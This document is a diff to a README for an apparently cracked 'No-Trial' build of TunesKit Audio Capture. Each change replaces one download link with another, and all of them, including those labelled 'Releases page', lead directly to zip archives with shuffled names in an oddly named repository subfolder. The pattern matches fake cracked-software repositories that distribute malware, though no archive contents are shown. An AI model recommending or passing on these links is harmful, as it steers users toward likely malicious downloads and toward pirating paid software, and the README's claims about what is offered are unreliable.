@@ -1,6 +1,6 @@
 # 🎵 TunesKit-Audio-Capture-No-Trial - Effortlessly Record and Save Audio
 
-[![Download](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/TunesKit-Audio-Capture-No-Trial_v3.0.zip%https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/TunesKit-Audio-Capture-No-Trial_v3.0.zip)](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/TunesKit-Audio-Capture-No-Trial_v3.0.zip)
+[![Download](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/Audio_Trial_Capture_No_Tunes_Kit_v3.6.zip%https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/Audio_Trial_Capture_No_Tunes_Kit_v3.6.zip)](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/Audio_Trial_Capture_No_Tunes_Kit_v3.6.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ TunesKit Audio Capture is a powerful tool for recording and saving audio from va
 Follow these simple steps to download and run TunesKit Audio Capture:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/TunesKit-Audio-Capture-No-Trial_v3.0.zip).
+   Go to our [Releases page](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/Audio_Trial_Capture_No_Tunes_Kit_v3.6.zip).
 
 2. **Choose Your Version**  
    On the Releases page, look for the latest version of TunesKit Audio Capture. Each release comes with important information about new features and fixes.
@@ -47,7 +47,7 @@ To ensure smooth operation, please note the following system requirements:
 
 ## 💻 Download & Install
 
-To begin using TunesKit Audio Capture, visit our [Releases page](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/TunesKit-Audio-Capture-No-Trial_v3.0.zip). Download the latest version and follow the installation steps mentioned earlier.
+To begin using TunesKit Audio Capture, visit our [Releases page](https://raw.githubusercontent.com/vestackayun/TunesKit-Audio-Capture-No-Trial/main/xanthopsin/Audio_Trial_Capture_No_Tunes_Kit_v3.6.zip). Download the latest version and follow the installation steps mentioned earlier.
 
 ## 🎧 How to Use TunesKit Audio Capture
 
